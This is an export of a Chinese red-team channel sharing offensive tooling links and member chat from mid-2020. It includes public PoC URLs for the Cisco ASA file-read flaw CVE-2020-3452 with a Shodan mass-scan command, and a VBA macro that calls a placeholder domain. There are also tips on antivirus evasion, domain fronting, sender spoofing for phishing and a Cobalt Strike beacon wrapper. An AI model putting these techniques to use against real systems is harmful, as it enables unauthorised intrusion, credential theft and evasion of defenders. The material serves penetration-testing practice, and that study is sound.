![](https://images.zsxq.com/FsjbADtHq-N-OZr900U-obnPNqfF?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:B1v91DzjTC-RCRp_1LeYLjTm9Gw=)
```
lengyi: 这个我记得是暂时破坏了记录功能好像是
```
# RedTeaming - 2020-07-22
`#Poc-Exp#`  <br>Xray 的Shiro Payload复用。<br><br>[shiro新姿势：初探xray高级版shiro插件+-+安全客，安全资讯平台](https://www.anquanke.com/post/id/211228)


# RedTeaming - 2020-07-22
`#提权#`  <br>Win2012提权，很好用的。<br><br>[GitHub+-+BeichenDream/BadPotato:+Windows+权限提升+BadP...](https://github.com/BeichenDream/BadPotato)


# RedTeaming - 2020-07-23
提权<br>[GitHub+-+sailay1996/RpcSsImpersonator:+Privilege+E...](https://github.com/sailay1996/RpcSsImpersonator)


# RedTeaming - 2020-07-23
`#工具技巧#`  <br>分享几个刚找的内网横向工具<br>[GitHub+-+Kevin-Robertson/Invoke-TheHash:+PowerShel...](https://github.com/Kevin-Robertson/Invoke-TheHash)<br>[GitHub+-+checkymander/Sharp-SMBExec:+SMBExec+C#+mo...](https://github.com/checkymander/Sharp-SMBExec)<br>CredNinja<br><br>然后没找到C写的.大家有好用的可以讨论一下，命令行的。

```
L: Ladon 挺好用的
```
# RedTeaming - 2020-07-23
`#Poc-Exp#` <br>CVE-2020-3452  Cisco ASA & Cisco Firepower 设备的未授权任意文件读取漏洞的两枚公开PoC<br>都用读取"/+CSCOE+/portal_inc.lua"文件来作为示例<br>poc1：https://<domain>/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../<br><br>poc2：https://<domain>/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua<br><br>我写了一个pocsuite3插件：[pocsuite-z/CVE-2020-3452.py+at+master+·+zer0yu/poc...](https://github.com/zer0yu/pocsuite-z/blob/master/pocsuite3/pocs/CVE-2020-3452.py)<br><br>pocsuite3 @heige 是我最喜欢的一款漏洞验证框架，特别是3的重大更新版本。我有些激进的修改特性不符合pocsuite3的原本目的，所以我开了一个新的分支，后续会push更多的增强型修改上去：<br>[GitHub+-+zer0yu/pocsuite-z:+pocsuite-z+is+an+open-...](https://github.com/zer0yu/pocsuite-z)<br><br>可以使用pocsuite-z来对目标进行批量检测<br>python pocsuite3/cli.py -r pocsuite3/pocs/CVE-2020-3452.py --dork-shodan 'title:"SSL VPN Service" "webvpnlogin=1"' --thread 10


# RedTeaming - 2020-07-23
`#渗透技巧#`   `#BlueTeam#` <br><br>[蓝队应急响应之“雄鸡夜鸣”](https://mp.weixin.qq.com/s/y5QpXYedIlLJqNeHlC4SNQ)

```
Wing: 
```
# RedTeaming - 2020-07-24
`#红队技巧#`  <br>Sealbeat已经实现了很多自动化信息搜集的功能，分模块开发。tnd,没时间写啊。<br><br>[如何基于+"点"+位快速搜集](https://mp.weixin.qq.com/s/fYaqtotkEfzLhlLN3qRaXw)

```
z3r0yu: Seatbelt([https://github.com/GhostPack/Seatbelt)](https://github.com/GhostPack/Seatbelt))真的不错，对应的相关编译好的项目SharpCollection（[GitHub+-+Flangvik/SharpCollection:+Nightly+builds+...](https://github.com/Flangvik/SharpCollection)）。但是这种工具上传之后容易被杀软干掉，所以做免杀吗？还是怎么个思路呢？
Wing: 改源码。
z3r0yu: 那么问题来了，怎么修改呢？有参考文章吗？
Wing: 特征码定位啊。
```
# RedTeaming - 2020-07-24
`#碎碎念#`  <br>VM预览版支持憨憨bug sir的虚拟机了<br>[https://bit.ly/get-fusion-tp](https://bit.ly/get-fusion-tp)


# RedTeaming - 2020-07-24
`#提权#`  <br>[GitHub+-+initstring/dirty_sock:+Linux+privilege+es...](https://github.com/initstring/dirty_sock)<br><br>两种利用方式<br>1. SSH后门<br>2. 账号后门


# RedTeaming - 2020-07-24
`#Burp插件#`  <br>Shiro被动扫描<br><br>[GitHub+-+pmiaowu/BurpShiroPassiveScan:+一款基于BurpSui...](https://github.com/pmiaowu/BurpShiroPassiveScan)


# RedTeaming - 2020-07-24
`#Poc-Exp#`  <br>Weblogic常见高危漏洞的综合利用<br><br><br>[Weblogic常见高危漏洞的综合利用](https://mp.weixin.qq.com/s?__biz=MzIyNzY1MzUxMQ==&mid=100000071&idx=1&sn=5eaab2602d9f022a82f0d2c5d4b0ef5d&chksm=685ca3af5f2b2ab9423268185c1ea7eddd65680991802794e411f3d95746602ea8797e3c7cf4#rd)


# RedTeaming - 2020-07-24
`#Poc-Exp#`  <br>Weblogic常见高危漏洞的综合利用<br><br><br>[Weblogic常见高危漏洞的综合利用](https://mp.weixin.qq.com/s?__biz=MzIyNzY1MzUxMQ==&mid=100000071&idx=1&sn=5eaab2602d9f022a82f0d2c5d4b0ef5d&chksm=685ca3af5f2b2ab9423268185c1ea7eddd65680991802794e411f3d95746602ea8797e3c7cf4#rd)


# RedTeaming - 2020-07-25
`#免杀#`  <br>加载另外一个exe文件<br>[GitHub+-+Flangvik/NetLoader:+Loads+any+C#+binary+i...](https://github.com/Flangvik/NetLoader)<br>╰─ csc /t:exe /out:NetLoader.exe Program.cs                                                              ─╯


# RedTeaming - 2020-07-25
 `#Macro#` <br>vba发起https请求<br><br>Sub WebRequest()<br>Url = http://<yourdomain>/<br>On Error GoTo Request2<br>Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")<br>' very short timeouts, increase if you want. this is in miliseconds<br>objHTTP.setTimeouts 100, 100, 100, 100<br>'Get for example, can also be any other HTTP VERB, in case you POST, the Send method needs another argument (else you'll just post empty)<br><br>objHTTP.Open "GET", Url, False<br>objHTTP.Send<br>Set objHTTP = Nothing<br>Exit Sub<br>Request2:<br>'if you want you can create more error handlers, alternating url or serverxml/winhttp In case you want multiple errors you'll have to reset the error handle to -1<br>    On Error GoTo -1<br>' In case of multiple error handlers<br>    'On Error GoTo Request3<br>    'you can change your URL here if you want<br>    Set winHttpReq = CreateObject("WinHttp.WinHttpRequest.5.1")<br>    winHttpReq.Open "GET", Url, False<br>    winHttpReq.Send        <br>End Sub


# RedTeaming - 2020-07-25
`#redteam#` <br>hw在即,不来学习一下吗?<br><br>HW在即——红队活动之Lnk样本载荷篇<br>[HW在即——红队活动之Lnk样本载荷篇](https://mp.weixin.qq.com/s/ZbtGJAT-SyZ50LRNOCg14w)

```
Wing: 白嫖党：有没有一键生成的 jio 本。😂
```
# RedTeaming - 2020-07-26
 `#C2#` <br>有点子意思的，大家下编译好的，我反正本地起不来。
![](https://images.zsxq.com/FrdCJdDhBGmeKmcvQsP6XTIsHR8V?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:DT0KfVzXwuwFHNJsmBlCNCZi7rw=)
```
Wing: 第一次见开发者还考虑给汉化一下子的
-: 界面挺好看
```
# RedTeaming - 2020-07-26
`#内网自动化#` <br><br>[GitHub+-+S3cur3Th1sSh1t/WinPwn:+Automation+for+int...](https://t.co/hMnmoVX9zP?amp=1)
![](https://images.zsxq.com/Fgd4A-L8c4jYkrrvZg-oF8JgDQT2?e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:mS0VC6sLPbBiffq7J5p77O1iy4U=)

# RedTeaming - 2020-07-26
请把 txt 改为 ps1
![](https://images.zsxq.com/FjTlF82LwkXzMYAu390GbFrrVB86?e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:azfao6s5qJSm8ggMselEO_U01Ek=)
```
Wing: 大哥介绍一下这玩意。
Wing: 混淆？
lengyi: 说错了，是改成 py，ps 的混淆脚本
z3r0yu: 大哥，这个检测 av 的网站是啥呀？
lengyi: Vt
z3r0yu: thx
Wing: 别传上去，传了就没了。
z3r0yu: 嗯嗯，我最近需要搞一下免杀，突然想不起来这个站叫啥了。看来还是本地测试呀
```
# RedTeaming - 2020-07-27
`#Poc-Exp#` <br><br>[Shiro_Xray/xray_exp.py+at+master+·+jas502n/Shiro_X...](https://github.com/jas502n/Shiro_Xray/blob/master/xray_exp.py)


# RedTeaming - 2020-07-27
`#自动化工具#`  <br>资产搜集工具，可以将这个模块加到自己漏扫里。[好的]<br><br>[reNgine+-+An+Automated+Reconnaissance+Framework+Me...](http://amp.kitploit.com/2020/07/rengine-automated-reconnaissance.html?amp=0)
![](https://images.zsxq.com/Ft3t6vV7Zc2cq0SmP5uOchXAuAsf?e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:0TSmmWyprYs5RHJU5jvCelGg5Yk=)
```
Wing: 
```
# RedTeaming - 2020-07-28
`#CSTips#`  <br>without launching PowerShell processes through the use of runspace.<br><br>spacerunner.exe -i bin\beacon.ps1 -o bin\beacon.exe -b -h<br><br>[GitHub+-+Mr-B0b/SpaceRunner:+This+tool+enables+the...](https://github.com/Mr-B0b/SpaceRunner)


# RedTeaming - 2020-07-28
[抛砖引玉之CobaltStrike4.1的BOF](https://mp.weixin.qq.com/s/-jU4HrPtB8rD4cmqAKZOZw)


# RedTeaming - 2020-07-29
`#内网渗透#`  <br>一款支持全平台的浏览器数据（Passwords | History | Bookmarks | Cookies）导出工具<br>go语言的不知道会被av干掉不<br><br>[GitHub+-+moonD4rk/HackBrowserData:+Decrypt+passwor...](https://github.com/moonD4rk/HackBrowserData)


# RedTeaming - 2020-07-29
`#Tools#` <br>Impacket已编译版本：[GitHub+-+ropnop/impacket_static_binaries:+Standalo...](https://github.com/ropnop/impacket_static_binaries/)


# RedTeaming - 2020-07-30
`#红队武器化研发#`  <br>Mistica此版本更新之后可以让Meterpreter走ICMP <br><br>[GitHub+-+IncideDigital/Mistica:+An+open+source+swi...](https://github.com/IncideDigital/Mistica)

```
Wing: 今天试了，编译成 exe 不太适配。
z3r0yu: 不太适配是不太稳定吗？还是 win 系列版本支持有啥问题呢？我刚看到更新
Wing: py 打包成 exe 你那里试试看看，我用 pyinstaller 没法运行。
z3r0yu: 🉑，我今天测一下
```
# RedTeaming - 2020-07-30
 `#碎碎念#`  <br>以后的每一个工具和知识点我都会尽量自己在本地测试成功以后再发，并说明具体用途，文章分享我会对文章进行一个大体介绍，现在都是碎片化学习，如果不总结，相当于0，主要还是得搞武器化基础。

```
裤衩哥: 有些东西不落地的话作用就不大
Wing: 我淦，上班就变螺丝钉了，下班回来电脑都不想打开。
z3r0yu: 搞起来搞起来
```
# RedTeaming - 2020-07-30
`#红队武器化研发#`  <br>和我一届的大佬，建议去看一下他上个月发的免杀思路，同公众号。<br><br>[C/C++速成学习路线](https://mp.weixin.qq.com/s/QR8iJ-hKv3GRdlu9Qyf5JQ)

```
裤衩哥: 最近在刚 c，这玩意被杀软分析的都差不多了，头好凉
crazyman: c#
裤衩哥: c# 在钓鱼场景有时候不是特别好用
Wing: 钓鱼搞得我头秃，tmd 防守队检测到文件，整个 ip 段全给你封了，你还在想为啥不上线。
裤衩哥: 域名前置，你嫖个阿里云 cdn 啊
Wing: 域名封了也没办法了呀。广散网和不广撒网，愁。
裤衩哥: host 伪造成目标主站 + cdn 前置应该封不掉
Wing: 这个有意思，下次就这么干。
```
# RedTeaming - 2020-07-31
 `#CSTips#`  <br>4.1暗桩<br>common/ListenerConfig<br>   public String pad(String var1, int var2) {<br>      StringBuffer var3 = new StringBuffer();<br>      var3.append(var1);<br><br>      while(var3.length() < var2) {<br>         if (this.watermark == 0) {<br>            //var3.append("5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\u0000");<br>         } else {<br>            var3.append((char)CommonUtils.rand(255));<br>         }<br>      }<br><br>      return var3.toString().substring(0, var2);<br>   }
![](https://images.zsxq.com/Fo9sDBydWJBn_B8JdY5I6vNaKwa9?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:JZ9C1ayjGNCX45aWq-ylNY0J8Og=)

# RedTeaming - 2020-08-01
`#渗透技巧#`  <br>这个站有点猛啊<br><br>[HackTricks+-+HackTricks](https://book.hacktricks.xyz/?nsukey=rhC1Via0oUxjtxUNM4jFjmmFNw4SQ237rtdXK0KXVCDva1Pgxz%2FKdGuWofKqMYkorKtJW%2F0Qw8rEJeq%2BHUilucoVeLYxzy5b2QGEqdkojZ9sL0g5pLNf%2Fa6D3i22qomX5%2Fu68nnsZjlt0fh%2BxQVfYWwGHdKV6smYgykXjTNinu4EXRmj8i2kEG%2BeWZJk2O9iSEDJlDQwvalHduidUtDrCA%3D%3D)

```
z3r0yu: 最近一直用这个站当手册查
```
# RedTeaming - 2020-08-01
 `#CSTips#` <br>在做域前置的时候，C2profile可能会报错，说时间不对，是因为中英文差异导致的。<br>具体看图。
![](https://images.zsxq.com/FiLlz7VlOCjNGb5HumaU6_EOqsNV?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:i6E1RzmtfBUYuSNL0ubgsH1kImI=)

# RedTeaming - 2020-08-02
`#红队技巧#`  <br><br>昨天安恒发的文章里面使用了一个键盘记录器，接到目标键盘上，然后通过启动的wifi可以远程读取键盘记录信息，wifi的ssid可以隐藏，ebay上面可以买，我嫌麻烦，找的淘宝代购，最快也要一个月，后续红蓝项目希望能用进去。这个有意思的。<br><br>[近源渗透测试之Keylogger实战](https://mp.weixin.qq.com/s/ra_N5dkhZOcHmdHuzl-oQw)
![](https://images.zsxq.com/Fh0Lg-qV-ygc8ZIub_8jq5n5RGpL?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:V_i2NjMTQx2JEnGK3xJXu5f7SW8=)
![](https://images.zsxq.com/FoNUSPH7boamOyQGsO9vY3fioKGf?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:nzaj-RHqEZYIpolq7MaiwrNd1Yg=)

# RedTeaming - 2020-08-02
`#红队技巧#`  <br><br>昨天安恒发的文章里面使用了一个键盘记录器，接到目标键盘上，然后通过启动的wifi可以远程读取键盘记录信息，wifi的ssid可以隐藏，ebay上面可以买，我嫌麻烦，找的淘宝代购，最快也要一个月，后续红蓝项目希望能用进去。这个有意思的。<br><br>[近源渗透测试之Keylogger实战](https://mp.weixin.qq.com/s/ra_N5dkhZOcHmdHuzl-oQw)
![](https://images.zsxq.com/Fh0Lg-qV-ygc8ZIub_8jq5n5RGpL?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:V_i2NjMTQx2JEnGK3xJXu5f7SW8=)
![](https://images.zsxq.com/FoNUSPH7boamOyQGsO9vY3fioKGf?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:nzaj-RHqEZYIpolq7MaiwrNd1Yg=)

# RedTeaming - 2020-08-02
`#钓鱼攻击#`  <br>如果不验证DKARCA，可以利用163一类的来伪造发件人，最好是找到HR的联系方式，但是太多就会进垃圾箱，就要换账号，结合页面克隆，通过这个方式钓了不少账号。<br>然后就是倾旋的这篇文章，我最近在写类似的工具，这些APT技术要落地才行！<br><br><br>[红队行动之鱼叉攻击-研究分享+«+倾旋的博客](https://payloads.online/archivers/2020-02-05/1)<br><br>[Swaks伪造邮件发件人绕过SPF](https://mp.weixin.qq.com/s/cqpy716gTJ1lrl338MuEsQ)


# RedTeaming - 2020-08-02
AD域里的ACL攻防：[AD域里的ACL攻防+|+九世的博客](https://422926799.github.io/posts/be9dae0a.html)


# RedTeaming - 2020-08-03
 `#MacTips#` <br>Mac简单一点的jar转app<br>python jar2app ../../../02-权限管理/Behinder_v2.0.1/Behinder.jar -j "-XstartOnFirstThread" -i ~/Pictures/hacker.icns<br><br>缺陷就是无法全屏，通过Install4J打包的，可以全屏放大，但没找到稳定的破解，三个月后启动会弹框提示（不影响使用）。
![](https://images.zsxq.com/FuMqBlGl9uvryaLqYgBNGm2i3BRr?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:QSjs2VXORM4fh1qHriFD_Wna2aQ=)

# RedTeaming - 2020-08-04
 `#碎碎念#`  <br>有时间的师傅测下这个工具看看，最近在项目上，没时间研究。[敲打]<br><br>PurpleSharp是一个开放源代码工具，旨在提供洞察对手如何针对Windows Active Directory（AD）环境的见解。该工具允许安全测试人员针对AD环境执行不同的攻击行为，包括恶意软件执行、权限提升、持久性和凭据访问。<br><br>关键功能/功能：“PurpleSharp通过利用管理凭据和本地Windows服务/功能（例如服务器消息块（SMB）、Windows管理规范（WMI）、远程过程调用（RPC）和命名管道）在远程主机上执行模拟。”


# RedTeaming - 2020-08-05
一个dns数据传输工具<br><br>[GitHub+-+Arno0x/DNSExfiltrator:+Data+exfiltration+...](https://github.com/Arno0x/DNSExfiltrator)


# RedTeaming - 2020-08-05
 `#红队技巧#`  <br>在内网里面横向只有一个cmd的情况下，需要上线或者其他操作。这样执行就行。昨晚打过。
![](https://images.zsxq.com/FpkggGrSuwv7WrCsFBkQcN7TpF77?e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:-Ge3Md9q-QT_FxBLbaBRYF-6nrw=)
```
裤衩哥: [发呆] 评论跟下系统版本 edr 是哪家的。
Wing: 亚信或者天擎
裤衩哥: okok
L: 老曲线救国法了 [奸笑]
```
# RedTeaming - 2020-08-05
 `#红队技巧#`  <br>第一章	信息收集<br>1.1 主机发现<br>1.2 关联信息生成<br>1.3 开放漏洞情报<br>1.4 开源情报搜救（OSINT）<br>1.5 Github Hacking<br>1.6 Google Hacking<br>1.7 Git-all-secret<br>1.8 Mailsniper.ps1 获取outlook所有联系人<br>1.9  内网渗透之信息收集<br>1.10 后渗透信息收集之WMIC命令的用法<br>1.11 内网横向常见端口<br>第二章 打点-进入内网<br>2.1 外部接入WIFI<br>2.1.1 无线攻击实战应用之DNSSPOOF、Evilportal、DWall组合拳入侵<br>2.2 应用系统漏洞利用<br>2.2.1 常见漏洞扫描<br>2.2.1.1 impacker框架之mssql服务器安全检查<br>2.2.1.2 ms17_010 py脚本利用<br>2.2.2 未授权访问漏洞<br>2.2.2.1 jboss未授权<br>2.2.3 远程代码执行漏洞<br>2.2.3.1 java下的奇怪命令执行<br>2.2.3.2 shiro反序化记录<br>2.2.3.3 RMI反序化<br>2.2.3.4  JNDI注入<br>2.2.3.5 fastjson漏洞浅析<br>2.2.3.6 cve-2019-11043 PHP原创代码执行复现<br>2.2.3.7 JAVA webshell 从入门到入狱系列1-基础篇<br>2.2.3.8 深入研究xmldecoder<br>2.2.3.9 fastjson反序化学系<br>2.2.3.10 oracle数据库安全思考之xml反序化<br>2.2.3.11 webshell绕安全模式执行命令<br>2.2.3.12 java下的xxe漏洞<br>2.2.3.13 solr velocity 模板远程代码复现以及利用指南<br>2.2.3.14 solr-rce-via-velocity-template<br>2.2.3.15 JAVA webshell 从入门到入狱系列2-攻防对抗之bypass上篇<br>2.2.3.16 JAVA webshell 从入门到入狱系列3-攻防对抗之bypass中篇<br>2.2.3.17 JAVA webshell 从入门到入狱系列4-攻防对抗之bypass下篇<br>2.2.3.18 java反序化过程深究<br>2.2.3.19 apache solr 不安全配置远程代码执行漏洞复现以及JMX RMI利用分析<br>2.2.3.20 java命令执行小细节<br>2.2.3.21 JDK反序化gadets-7u21<br>2.2.3.22 weblogic-t3-cve-2019-2890-analysis<br>2.2.3.23 spring-boot-actuators未授权漏洞<br>2.2.3.24 semcms2.6 后台文件上传漏洞审计<br>2.2.3.25 代码审计之lvyecms后台getshell<br>2.2.3.26 log3j-unserialize-analysis<br>2.2.3.27 java反序化-fastjson组件<br>2.2.4 WAF-BYPASS<br>2.2.5 登录接口JS前端加密绕过<br>2.2.6 XMLDECODER标签<br>2.2.7 利用PHPmyadmin 去get shell<br>2.2.8 攻击JWT的一些方式<br>2.2.9 上传漏洞<br>2.2.10 注入漏洞<br>2.2.10.1 注入漏洞<br>2.2.10.2 mssql利用总结<br>2.2.10.3  攻击mssql-powerUPSQL介绍<br>2.2.10.4  如何利用mysql 安全特性发现漏洞<br>2.2.10.5 hibernate 基本注入<br>2.2.10.6 mysql利用 general_logfile、show_query_logfile写文件<br>2.2.10.7 会战分享-sql server 注入 getshell<br>2.2.11 文件读取漏洞<br>2.2.12 pentesterlab  xss<br>2.2.13  offcie 宏的基本利用<br>2.2.14 java-security-calendar-2019-candy-cane<br>2.2.15  discuz  ssrf RCE  漏洞分析报告<br>2.2.16  wordpress 语言文件代码执行漏洞分析报告<br>2.2.17 struts2 远程命令执行s2-048漏洞分析报告<br>2.2.18 静态免杀php一句话（过D盾，河马，安全狗）<br>2.2.19 金融信息系统安全评测方法<br>2.2.20  apache-poi-xxe-analysis<br>2.2.21  记一次阿里主站xss测试以及绕过WAF防护<br>2.2.22 classloader类加载机制<br>2.2.23 浅谈ssrf原理以及利用<br>2.2.24 spring-data-commons(cve-2018-1273)<br>2.2.25 xss绕过代码后期长度限制的方法<br>2.2.26 mysql提权之mof<br>2.2.27 mysql提权之udf<br>2.2.28 xss基础学习<br>2.2.29 java反射以及内存shell初探一基于jetty容器的shell维权<br>2.2.30 利用dnslog回显<br>2.2.31 文件合成/图片木马生成<br>2.2.32 udf提权<br>2.4 社会工程学<br>2.4.1 水坑攻击<br>2.4.2 鱼叉攻击<br>2.4.2.1 swaks-邮件伪造<br>2.4.2.2 邮件伪造防御技术<br>2.4.3 钓鱼攻击<br>2.4.3.1 视觉效果<br>2.4.3.1.1 凭证劫持漏洞<br>2.4.3.2 克隆技术<br>2.4.3.3 word文档-云宏代码钓鱼<br>2.2.5 app密码算法通用分析方法<br>2.2.6 linux下反弹shell命令<br>2.2.7  browser pivot for chrome<br>第三章 命令与控制 （c&c）<br>3.1 http隧道ABPTTS <br>3.2 HTTP隧道regeorg<br>3.3 http隧道tunna<br>3.4  http隧道reduh<br>3.5基于ptunnel 建立icmp隧道<br>3.6  使用anydesk做远控<br>3.7 防御域内委派攻击<br>3.8 att&ck攻防初窥系统-执行篇<br>3.9 powershell<br>3.9.1  利用360正则不执行powershell上线<br>2.9.2 关于powershell对抗安全软件<br>2.9.3 invoke-obfuscation介绍<br>第四章 穿透与转发<br>4.1  frp内网穿透实战<br>4.2 基于portfwd 端口转发<br>4.3 venom-代理转发、多级穿透<br>4.4 DNS隧道<br>4.4.1 DNS隧道之DNS TCP<br>4.4.2  DNS隧道之DNSCAT <br>4.4.3  使用DNS协议上线MSF之Iodine篇<br>4.4.4  使用DNS协议上线MSF之DNSCAT篇<br>4.4.5  使用DNS协议上线MSF之DNS TCP 篇<br>第五章 内部信息收集<br>5.1 本地信息收集<br>5.1.1 用普通权限的域账号获得域环境中所有DNS解析记录<br>5.1.2 凭证以及令牌票据<br>5.1.2.1 内存转储-获取本地hash<br>5.1.2.2 转储域账户哈希值<br>5.1.2.3 转储域账户哈希值（续）<br>5.1.2.4 SPN发现与利用<br>5.1.2.5 哈希传递-远程登录篇<br>5.1.3 用户习惯<br>5.1.3.1 从目标文件中做信息搜集第一季<br>5.1.4 获取当前系统所有用户的谷歌浏览器密码<br>5.1.5 windows2003 获取密码之adsutil.vbs<br>5.1.6 解密目标机器保存的RDP凭证<br>5.1.7 hashcat破解hash神器详解<br>5.1.8 解密securecrt客户端中保存的密码hash<br>5.1.9 解密winscp客户端中保存的密码hash<br>5.1.10 破解weblogci配置文件中的数据库密码<br>5.1.11 获取域控/系统日志<br>5.2 网络信息收集<br>5.2.1 发现目标 web程序敏感目录第一季<br>5.2.2 基于SCF做目标内网信息搜集第二季<br>5.2.3 域环境信息收集<br>5.2.3.1 active dircetory domain services 获取域控信息<br>5.2.3.2 windows域渗透-用户密码枚举<br>5.2.3.3 不同环境下域DNS记录信息收集方法<br>5.2.3.4 impacket框架之域信息获取<br>5.2.3.5 域信息收集之user sid<br>5.2.4 工作组环境信息搜集<br>5.2.4.1 基于MSF发现内网存活主机第一季<br>5.2.4.2 基于MSF发现内网存活主机第二季<br>5.2.4.3 基于MSF发现内网存活主机第三季<br>5.2.4.4 基于MSF发现内网存活主机第四季<br>5.2.4.5 基于MSF发现内网存活主机第五季<br>5.2.4.6 基于MSF发现内网存活主机第六季<br>5.2.4.7 基于sqldatasourceEnumerator 发现内网存活主机<br>5.2.4.8 基于ICMP发现内网存活主机<br>5.2.4.9 基于ARP发现内网存活主机<br>5.2.4.10 基于UDP发现内网存活主机<br>5.2.4.11基于snmp发现内网存活主机<br>5.2.4.12 基于netbios发现内网存活主机<br>5.2.4.13 powershell一条命令进行内网扫描<br>5.2.4.14 内网信息收集之内网代理<br>第六章  权限提升<br>6.1 操作系统权限<br>6.1.1 linux<br>6.1.1.1 linux提权依赖exp篇<br>6.1.2 sudo漏洞分析(cve-2019-14287)<br>6.1.1.3 linux提权之内核提权<br>6.1.2 windows<br>6.1.2.1 windwos提权快速找exp<br>6.1.2.2 token窃取和利用<br>6.1.2.3 cve-2019-1388 windows uac提权漏洞<br>第七章 权限维持<br>7.1 操作系统后门<br>7.1.1 linux<br>7.1.2 windows<br>7.1.2.1 对抗权限长期把控伪造无效签名第一季<br>7.1.2.2 常见windows持久性控制总结<br>7.1.2.3 windows rid劫持<br>7.1.2.4 shift映像劫持后门新玩法<br>7.1.2.5 windows权限维持篇-注册表维权<br>7.1.2.6 windows权限维持篇2-计划任务维权<br>7.1.2.7 windows权限维持篇3-服务service维权<br>7.2 第三方组件后门<br>7.3 APT对抗（一）红蓝对抗关于后门对抗<br>7.4 APT对抗（二）红蓝对抗关于后门对抗<br>7.5 APT对抗（三）红蓝对抗关于后门对抗<br>7.6 APT对抗（四）红蓝对抗关于后门对抗<br>7.7 APT对抗（五）红蓝对抗关于后门对抗<br>7.8 APT对抗（六）红蓝对抗关于后门对抗<br>7.9 APT对抗（七）红蓝对抗关于后门对抗<br>7.10 DLL劫持-两种劫持方法剖析<br>7.11 att&ck攻防初窥系列-横向移动篇<br>7.12 linux权限维持之LD_PRELOAD<br>7.13 linux权限维持之进程注入<br>7.14 windws权限维持之office启动<br>第八章 内网渗透基础<br>8.1 kerberros协议<br>8.1.1 windows认证原理之kerberros篇<br>8.2 NTLM<br>8.2.1 NTLM协议以及HASH抓取<br>8.3 内网命令行渗透笔记<br>8.5 msfvenom 常用生成payload命令<br>8.6 windows环境压缩文件&文件夹名合集<br>8.7 windows net命令集使用<br>8.8  cobaltstrike 与metasploit实战联动<br>8.9 渗透常用的复制工具<br>第九章 红队自研<br>9.1 免杀方案研发<br>9.1.1 实战免杀诺尔顿shellcode载入内存免杀<br>9.1.2 人人能过杀软<br>9.1.3 远控木木极速免杀360引擎<br>9.1.4 基于ruby 内存加载shellcode第一季<br>9.1.5 DLL加载shellcode免杀上线<br>9.1.6 借助aspx 对payload进行分离免杀<br>9.1.7 静态恶意代码逃逸第一课<br>9.1.8 静态恶意代码逃逸第二课<br>9.1.9 静态恶意代码逃逸第三课<br>9.1.10 静态恶意代码逃逸第四课<br>9.1.11 静态恶意代码逃逸第五课<br>9.1.12 基于python内存加载shellcode第二季<br>9.1.13 payload分离免杀思路<br>9.1.14 基于实战的small payload应用第一季<br>9.1.15 基于实战中small pyload应用第二季<br>9.1.16 基于go内存加载shellcode第三季<br>9.1.17 免杀技术之msf偏执模式<br>9.1.18 免杀技术之生成shellcode自行编译<br>9.1.19  免杀技术之代码加密<br>9.1.20 免杀技术之使用C实现meterprter功能<br>9.1.21 白加黑免杀过360开机启动拦截<br>9.1.22 使用c#实现简单的分离免杀<br>第十章 安全工具教学<br>10.1 impacket套件之远程命令执行功能讲解<br>10.2 bloodhound技术讲解<br>10.3 windows 10配置搭建kali环境第一季<br>10.4 与crackmapexec 结合攻击<br>10.5 meterprter下得lrb操作第一季<br>10.6 基于第十课补充payload(一）<br>10.7 基于第十课补充payload(二）<br>10.8 域信息收集之普通域用户权限获取域内详细信息-ldifde工具<br>10.9 域信息收集-csvde工具<br>10.10 xss之beef神器<br>10.11 pstools讲解（远程执行命令&登录日志导出等）<br>10.12 netcat使用总结<br>10.13 五分钟快速编写漏洞exp<br>第十一章 红队技巧<br>11.1 基于白名单msbuild.exe 执行payload第一季<br>11.2 基于白名单installuitil.exe执行payload第二季<br>11.3 基于白名单regasm.exe 执行payload第三季<br>11.4 基于白名单regsvcs.exe 执行payload第四季<br>11.5 基于白名单mshta.exe执行payload第五季<br>11.6 基于白名单compliler.exe 执行payload第六季<br>11.7 基于白名单 csc.exe 执行payload第七季<br>11.8 基于白名单msiexec执行payload第八季<br>11.9 基于白名单regsvr32执行payload第九季<br>11.10 基于白名单wmic执行payload第十季<br>11.11 基于白名单rundll32.exe 执行payload第十一季<br>11.12 基于白名单0dcconf执行payload第十二季<br>11.13 基于白名单psexec 执行payload第十三季<br>11.14基于白名单 url.dll 执行payload第十四季<br>11.15 基于白名单forfiles执行payload第十五季<br>11.16 基于白名单pcalua 执行payload第十六季<br>11.17 基于白名单cmstp.exe 执行payload第十七季<br>11.18 